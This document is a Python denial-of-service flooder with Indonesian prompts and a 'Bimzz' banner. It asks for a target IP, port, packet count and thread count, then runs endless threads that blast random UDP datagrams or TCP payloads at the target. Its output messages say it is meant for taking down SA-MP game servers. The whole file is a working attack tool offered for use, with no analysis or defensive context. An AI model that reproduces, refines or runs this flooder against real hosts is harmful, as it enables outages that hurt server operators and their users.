# remake ngotak bngst.
# minimal credit di print nya.
import os
import sys
import time
import struct
import signal
import socket
import codecs
import random
import threading

##########################################################
# BANNER
banner = """\033[1;36;40m
\u001b[31m
═══════════════════════════════════════════════
╔══╗
║╔╗║
║╚╝╚╦╦╗╔╦═══╦═══╦╗╔╗
║╔═╗╠╣╚╝╠══║╠══║╠╬╬╝
║╚═╝║║║║║║══╣║══╬╬╬╗
╚═══╩╩╩╩╩═══╩═══╩╝╚╝
═══════════════════════════════════════════════
# Build at 9/7/2022   ════>   Subscribe YouTube Bimzz
╔═══════════════════════════════════════════════"""
##########################################################
# MAIN MENU
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
choice = str(input("╠═══[ Masukkan METHODS-nya [tcp/udp] ] •\n╚══> "))
time.sleep(1)
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
ip = str(input("╠═══[ Masukkan IP-nya ] •\n╚══> "))
time.sleep(1)
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
port = int(input("╠═══[ Masukkan PORT-nya ] •\n╚══> "))
time.sleep(1)
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
times = int(input("╠═══[ Masukkan PACKETs-nya ] •\n╚══> "))
time.sleep(1)
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
size = int(input("╠═══[ Masukkan THREADs-nya ] •\n╚══> "))
##########################################################

def x():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"[ UDP ] | BimzzxDestryoedSampServers | ")
		except:
			print(f"[ UDP ] | BimzzxDestryoedSampServers | ")

def xx():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"[ UDP ] | BimzzxDestryoedSampServers | ")
		except:
			print(f"[ UDP ] | BimzzxDestryoedSampServers | ")

def xxx():
	data = random._urandom(999)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"[ UDP ] | BimzzxDestryoedSampServers | ")
		except:
			print(f"[ UDP ] | BimzzxDestryoedSampServers | ")

def tcpx():
  data = random._urandom(761)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"[ TCP ] | BimzzxDestryoed | ")
    except:
      s.close()
      print(f"[ TCP ] | BimzzxDestryoed | ")

def tcpxx():
  data = random._urandom(102400)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"[ TCP ] | BimzzxDestryoed | ")
    except:
      s.close()
      print(f"[ TCP ] | BimzzxDestryoed | ")

for i in range(size):
	if choice == 'udp':
		fuckk = threading.Thread(target = x)
		fuckk.start()
		fuck = threading.Thread(target = xx)
		fuck.start()
		fuckkk = threading.Thread(target = xxx)
		fuckkk.start()
	elif choice == 'tcp':
		fucking = threading.Thread(target = tcpx)
		fucking.start()
		fuckking = threading.Thread(target = tcpxx)
		fuckking.start()